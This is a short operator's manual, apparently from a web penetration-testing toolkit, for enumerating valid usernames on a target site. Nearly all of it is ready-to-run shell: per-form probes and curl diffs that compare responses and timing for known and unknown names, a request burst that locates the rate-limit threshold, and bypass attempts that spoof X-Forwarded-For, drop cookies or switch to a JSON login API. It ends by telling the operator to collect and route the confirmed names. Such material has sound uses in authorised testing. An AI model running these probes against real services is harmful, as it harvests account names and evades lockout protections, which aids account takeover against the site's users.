# Field manual — the on-target operating guide

## The opening moves

1. `enum_probe --selftest` — the tool works
2. register your account → known-good
3. probe the direct oracle (`check-username`, register-taken) — one
   request may confirm the whole class

## The per-form probe (the workhorse)

```bash
for form in login register forgot-password check-username; do
  echo "=== $form ==="
  python3 tools/web/enum_probe.py --url "$BASE/$form" \
    --body 'user={U}&pass=x' --known-user KNOWN --method POST 2>&1 | tail -8
done
```

The tool reports which channel separates the arms with verbatim
excerpts — a "uniform" result per form is a real negative for that form.

## The manual diff (when the tool needs a different body)

```bash
curl -i -X POST -d 'user=KNOWN&pass=x'      "$BASE/<form>" > good
curl -i -X POST -d 'user=zzz-NOSUCH&pass=x' "$BASE/<form>" > bad1
curl -i -X POST -d 'user=zzz-NOSUCH&pass=x' "$BASE/<form>" > bad2
diff bad1 bad2   # the noise baseline — mask it
diff good bad1   # the differential — a repeated delta on a channel
```

## The timing baseline

```bash
for i in $(seq 10); do
  curl -s -o /dev/null -w "g %{time_total}\n" -X POST -d 'user=KNOWN&pass=x' "$BASE/<f>"
  curl -s -o /dev/null -w "b %{time_total}\n" -X POST -d 'user=zzz-NOSUCH&pass=x' "$BASE/<f>"
done | awk '{print $1, $2}' | sort | awk '{a[$1]+=$2;c[$1]++}END{print "good",a["g"]/c["g"],"bad",a["b"]/c["b"]}'
```

## The throttle burst

```bash
for i in $(seq 15); do curl -s -o /dev/null -w '%{http_code} ' -X POST -d "user=x$i&pass=y" "$BASE/login"; done; echo
```

`200`/`401` throughout → absent. A `429`/`423` at N → the threshold.

## The bypass check (if limited)

```bash
curl -s -o /dev/null -w '%{http_code}\n' -X POST -H 'X-Forwarded-For: 1.2.3.4' -d 'user=x&pass=y' "$BASE/login"
curl -s -X POST -d 'user=x&pass=y' "$BASE/login"   # fresh, no cookie jar
curl -s -o /dev/null -w '%{http_code}\n' -X POST -d '{"username":"x","password":"y"}' -H 'Content-Type: application/json' "$BASE/api/login"
```

## The close

Record per-form oracles + the throttle + the confirmed names; route the
names; record the negatives. The field notes in `../field-notes.md` grow
with every real measurement.
